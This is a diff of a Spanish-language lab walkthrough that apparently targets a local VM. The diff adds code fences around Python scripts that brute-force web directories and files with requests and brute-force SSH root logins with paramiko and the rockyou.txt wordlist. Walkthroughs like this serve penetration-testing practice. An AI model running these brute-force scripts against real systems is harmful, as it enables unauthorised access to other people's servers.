@@ -58,6 +58,7 @@ El Html nos dice poco excepto que no sobre-pensemos la solución.
 
 Buscamos directorios mediante fuerza bruta con Python y requests.
 
+'''python
 import requests
 
 ip = 'http://192.168.56.102/'
@@ -71,12 +72,12 @@ with open(payload, 'r') as file:
         response = requests.get(url)
         if response.status_code == 200:
             print(f'[+] {url}  status-code [{response.status_code}]')
-
+'''
 Salida:
 [+] http://192.168.56.102/  status-code [200]
 
 No encontramos ningún directorio sospechoso y procedemos a buscar archivos mediante el uso de la misma tecnica.
-
+'''python
 import requests
 
 ip = 'http://192.168.56.102/'
@@ -92,6 +93,7 @@ with open(payload, 'r') as file:
             response = requests.get(url)
             if response.status_code == 200:
                 print(f'[+] {url}  status-code [{response.status_code}]')
+'''
 Salida:
 [+] http://192.168.56.102/index.html  status-code [200]
 
@@ -99,7 +101,7 @@ Solo encontramos un archivo.
 
 
 Pasamos a revisar SSH tratando de conectar como 'root' usando paramiko y rockyou.txt
-
+'''python
 import paramiko
 
 server = '192.168.56.102'
@@ -118,7 +120,7 @@ with open(file, 'r') as payloads:
         except paramiko.ssh_exception.AuthenticationException as err:
             print(f'[-] {username}: {payload[:-1]}')
             ssh.close()
-
+'''
 Salida:
 .
 .
